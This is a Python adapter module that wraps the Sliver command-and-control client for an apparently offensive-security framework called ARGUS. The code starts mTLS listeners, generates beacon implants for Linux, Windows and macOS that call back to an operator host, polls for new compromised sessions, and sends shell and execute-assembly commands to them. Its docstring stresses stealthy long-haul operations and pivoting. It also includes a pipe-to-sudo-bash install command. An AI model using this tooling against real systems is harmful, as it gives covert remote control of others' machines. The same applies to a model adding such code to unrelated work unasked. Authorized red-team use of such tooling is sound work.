"""
sliver_adapter.py - Sliver C2 integration scaffold.

Why this exists
---------------
ARGUS's ShellAgent gives an interactive PTY shell.  Real engagements
need C2 capabilities the PTY can't provide:
  - Beacon callbacks (sleep + jitter) for stealth long-haul ops
  - Cross-platform implant generation (Linux / Windows / macOS)
  - Encrypted comms over mTLS / DNS / HTTP(S)
  - Multi-stager / pivot through compromised hosts
  - Stable execution surface (no fragile bash subshells)

Sliver (BishopFox) is the OSS-friendly modern C2 that fills this gap.
This adapter wraps the `sliver-client` CLI so ARGUS can spawn listeners,
generate implants, track callbacks, and task beacons.

Security
--------
All subprocess invocations use asyncio.create_subprocess_exec with
positional argv lists (the safe execFile-equivalent form).  No shell
is invoked at any point; user-controllable strings flow as discrete
argv tokens and cannot be interpreted as commands.
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


SLIVER_CLI = os.environ.get("SLIVER_CLIENT_BIN", "sliver-client")
SLIVER_CONFIG = os.environ.get("SLIVER_CONFIG", "")
SLIVER_TIMEOUT = int(os.environ.get("SLIVER_TIMEOUT_SEC", "120"))


@dataclass
class SliverSession:
    session_id:  str
    hostname:    str
    username:    str
    os:          str
    arch:        str
    transport:   str
    remote_addr: str
    first_contact: float = field(default_factory=time.time)
    last_checkin:  float = field(default_factory=time.time)
    active:      bool  = True


class SliverAdapter:
    """Thin async wrapper around the sliver-client CLI."""

    def __init__(self, cli: str = SLIVER_CLI, config: str = SLIVER_CONFIG):
        self.cli = cli
        self.config = config
        self.sessions: Dict[str, SliverSession] = {}
        self.listeners: Dict[str, Dict[str, Any]] = {}

    async def check_available(self) -> Tuple[bool, str]:
        path = shutil.which(self.cli)
        if not path:
            return False, (
                f"sliver-client binary not on PATH ({self.cli}). "
                f"Install Sliver: curl https://sliver.sh/install | sudo bash"
            )
        if not self.config or not os.path.isfile(self.config):
            return False, (
                f"SLIVER_CONFIG not set or file missing "
                f"({self.config or '<unset>'}). "
                f"Generate via: sliver new-operator --name argus --lhost <ip>"
            )
        try:
            proc = await asyncio.create_subprocess_exec(
                self.cli, "version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            if proc.returncode != 0:
                return False, f"sliver-client version returned exit {proc.returncode}"
            version = stdout.decode(errors="ignore").strip().splitlines()[0][:80]
            return True, f"Sliver ready: {version}"
        except Exception as exc:
            return False, f"sliver-client check failed: {exc}"

    async def start_listener(self, kind: str = "mtls",
                             host: str = "0.0.0.0", port: int = 8443
                             ) -> Optional[str]:
        argv = self._base_argv() + [kind, "--lhost", host, "--lport", str(port)]
        try:
            exit_code, stdout, stderr = await self._run(argv, SLIVER_TIMEOUT)
        except Exception as exc:
            logger.warning("[sliver] start_listener error: %s", exc)
            return None
        if exit_code != 0:
            logger.warning("[sliver] start_listener exit=%s: %s",
                           exit_code, stderr[:200])
            return None
        m = re.search(r"listener\s+([A-Z0-9]+)", stdout, re.I)
        lid = m.group(1) if m else f"{kind}:{port}"
        self.listeners[lid] = {"kind": kind, "host": host, "port": port}
        return lid

    async def generate_implant(self, kind: str = "beacon",
                               os_name: str = "linux", arch: str = "amd64",
                               callback: str = "mtls://0.0.0.0:8443",
                               output: Optional[str] = None,
                               format_: str = "exe") -> Optional[str]:
        if output is None:
            ts = int(time.time())
            ext = ".exe" if os_name == "windows" else ".bin"
            output = f"/tmp/argus-sliver-{kind}-{os_name}-{arch}-{ts}{ext}"
        m = re.match(r"(?P<scheme>\w+)://(?P<host>[^:/]+)(:(?P<port>\d+))?",
                     callback)
        if not m:
            logger.warning("[sliver] bad callback format: %s", callback)
            return None
        scheme = m.group("scheme")
        cb_host = m.group("host")
        cb_port = m.group("port") or "8443"
        argv = self._base_argv() + [
            "generate", kind,
            "--os", os_name, "--arch", arch, "--format", format_,
            f"--{scheme}", f"{cb_host}:{cb_port}",
            "--save", output,
        ]
        try:
            exit_code, _stdout, stderr = await self._run(argv, SLIVER_TIMEOUT)
        except Exception as exc:
            logger.warning("[sliver] generate_implant error: %s", exc)
            return None
        if exit_code != 0 or not os.path.isfile(output):
            logger.warning("[sliver] generate exit=%s, present=%s, stderr=%s",
                           exit_code, os.path.isfile(output), stderr[:200])
            return None
        return output

    async def list_sessions(self) -> List[SliverSession]:
        argv = self._base_argv() + ["sessions"]
        try:
            exit_code, stdout, _ = await self._run(argv, 15)
        except Exception:
            return list(self.sessions.values())
        for line in stdout.splitlines():
            m = re.match(r"^([A-Z0-9]{6,})\s+(\S+)\s+(\S+@\S+)\s+(\S+)\s+(\S+)\s+(\S+)",
                         line.strip())
            if not m:
                continue
            sid = m.group(1)
            if sid in self.sessions:
                self.sessions[sid].last_checkin = time.time()
                continue
            self.sessions[sid] = SliverSession(
                session_id  = sid,
                hostname    = m.group(2),
                username    = m.group(3),
                os          = m.group(4),
                arch        = m.group(5),
                transport   = m.group(6),
                remote_addr = "",
            )
        return list(self.sessions.values())

    async def wait_for_session(self, timeout: int = 300, poll: float = 5.0
                               ) -> Optional[SliverSession]:
        baseline = set(self.sessions.keys())
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            sessions = await self.list_sessions()
            for s in sessions:
                if s.session_id not in baseline:
                    return s
            await asyncio.sleep(poll)
        return None

    async def task_session(self, session_id: str, cmd: str,
                           timeout: int = 60) -> Tuple[int, str, str]:
        argv = self._base_argv() + [
            "execute-assembly" if cmd.endswith(".exe") else "shell",
            "--cmd", cmd, "--session", session_id,
        ]
        return await self._run(argv, timeout)

    def _base_argv(self) -> List[str]:
        out = [self.cli]
        if self.config:
            out += ["--config", self.config]
        return out

    async def _run(self, argv: List[str], timeout: int
                   ) -> Tuple[int, str, str]:
        # Positional argv via asyncio.create_subprocess_exec - no shell.
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True,
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout,
            )
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            return -1, "", "timeout"
        return (
            proc.returncode or 0,
            stdout.decode(errors="replace"),
            stderr.decode(errors="replace"),
        )


__all__ = ["SliverAdapter", "SliverSession"]
